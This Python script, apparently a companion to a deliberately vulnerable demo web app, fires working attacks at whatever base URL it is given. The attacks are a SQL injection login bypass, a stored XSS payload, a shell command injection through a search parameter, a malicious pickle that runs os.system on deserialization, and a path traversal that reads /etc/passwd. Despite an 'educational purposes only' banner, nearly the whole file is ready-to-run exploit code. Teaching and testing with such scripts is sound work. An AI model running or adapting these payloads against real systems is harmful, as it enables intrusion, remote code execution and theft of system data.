#!/usr/bin/env python3

import requests
import base64
import pickle
import sys
import os


def print_banner(text):
    print("\n" + "=" * 80)
    print(f" {text} ".center(80, "="))
    print("=" * 80)


def test_sql_injection(base_url):
    print_banner("Testing SQL Injection Vulnerability")
    
    # Normal login should fail
    print("Attempting normal login with incorrect credentials...")
    response = requests.post(
        f"{base_url}/login",
        data={"username": "admin", "password": "wrongpassword"}
    )
    print(f"Response status: {response.status_code}")
    print("Login should fail (and it did)" if "Invalid credentials" in response.text else "Unexpected response")
    
    # SQL injection attack
    print("\nAttempting SQL injection attack...")
    response = requests.post(
        f"{base_url}/login",
        data={"username": "' OR '1'='1", "password": "anything"}
    )
    print(f"Response status: {response.status_code}")
    
    # Check if we were redirected to the profile page (successful bypass)
    if response.url.endswith("/profile"):
        print("SQL INJECTION SUCCESSFUL! Authentication bypassed.")
    else:
        print("SQL injection failed - application might be secure against this attack.")


def test_xss(base_url):
    print_banner("Testing Cross-Site Scripting (XSS) Vulnerability")
    
    # First register a user with a malicious username
    xss_payload = "<script>alert('XSS')</script>"
    print(f"Registering user with XSS payload: {xss_payload}")
    
    response = requests.post(
        f"{base_url}/register",
        data={"username": xss_payload, "password": "Password123!"}
    )
    
    # Now login with that user
    print("Logging in with the XSS payload user...")
    response = requests.post(
        f"{base_url}/login",
        data={"username": xss_payload, "password": "Password123!"}
    )
    
    # Check profile page for unescaped script tag
    print("Checking profile page for XSS vulnerability...")
    response = requests.get(f"{base_url}/profile", cookies=response.cookies)
    
    if xss_payload in response.text:
        print("XSS VULNERABILITY DETECTED! Script tag was not escaped.")
        print("In a real browser, this would execute the JavaScript code.")
    else:
        print("XSS payload was escaped or removed - application might be secure against this attack.")


def test_command_injection(base_url):
    print_banner("Testing Command Injection Vulnerability")
    
    # Normal search
    print("Performing normal search...")
    response = requests.get(f"{base_url}/search?q=sample")
    print(f"Response status: {response.status_code}")
    print("Normal search results:")
    print(response.text.split("<h2>Results:</h2>")[1].split("</ul>")[0])
    
    # Command injection attack
    command = "test; ls -la"
    print(f"\nAttempting command injection with: {command}")
    response = requests.get(f"{base_url}/search?q={command}")
    
    if "total" in response.text and "drwx" in response.text:
        print("COMMAND INJECTION SUCCESSFUL! Server directory listing:")
        print(response.text.split("<h2>Results:</h2>")[1].split("</ul>")[0])
    else:
        print("Command injection failed - application might be secure against this attack.")


def test_insecure_deserialization(base_url):
    print_banner("Testing Insecure Deserialization Vulnerability")
    
    class EvilPickle:
        def __reduce__(self):
            # This would execute 'id' command when deserialized
            # In a real attack, this could be much more dangerous
            return (os.system, ('id',))
    
    # Create a malicious pickle
    evil_data = pickle.dumps(EvilPickle())
    encoded_data = base64.b64encode(evil_data).decode('utf-8')
    
    print("Sending malicious serialized data...")
    response = requests.get(f"{base_url}/api/user_data?data={encoded_data}")
    
    print(f"Response status: {response.status_code}")
    print(f"Response: {response.text}")
    
    if "error" not in response.text.lower():
        print("INSECURE DESERIALIZATION VULNERABILITY DETECTED!")
        print("The server executed the command in the pickle data.")
    else:
        print("Deserialization attack failed - application might be secure against this attack.")


def test_path_traversal(base_url):
    print_banner("Testing Path Traversal Vulnerability")
    
    # Try to access /etc/passwd (a common target for path traversal)
    traversal_path = "../../../etc/passwd"
    print(f"Attempting to access {traversal_path} via path traversal...")
    
    response = requests.get(f"{base_url}/download_log?filename={traversal_path}")
    
    print(f"Response status: {response.status_code}")
    print(f"Response length: {len(response.text)} bytes")
    
    # Check for common patterns in /etc/passwd
    if "root:" in response.text and ":/bin/" in response.text:
        print("PATH TRAVERSAL VULNERABILITY DETECTED!")
        print("First few lines of /etc/passwd:")
        print("\n".join(response.text.split("\n")[:5]))
    else:
        print("Path traversal attack failed - application might be secure against this attack.")


def main():
    if len(sys.argv) < 2:
        print("Usage: python test_vulnerabilities.py <base_url>")
        print("Example: python test_vulnerabilities.py http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    
    print(f"Testing vulnerabilities against: {base_url}")
    print("WARNING: This is for educational purposes only. Do not use against systems without permission.")
    
    try:
        # Test if the server is running
        requests.get(base_url, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"Error: Could not connect to {base_url}")
        print(f"Exception: {e}")
        sys.exit(1)
    
    # Run the tests
    test_sql_injection(base_url)
    test_xss(base_url)
    test_command_injection(base_url)
    test_insecure_deserialization(base_url)
    test_path_traversal(base_url)
    
    print_banner("Testing Complete")
    print("Remember: These tests are simplified demonstrations of vulnerabilities.")
    print("In a real security assessment, more thorough testing would be performed.")


if __name__ == "__main__":
    main()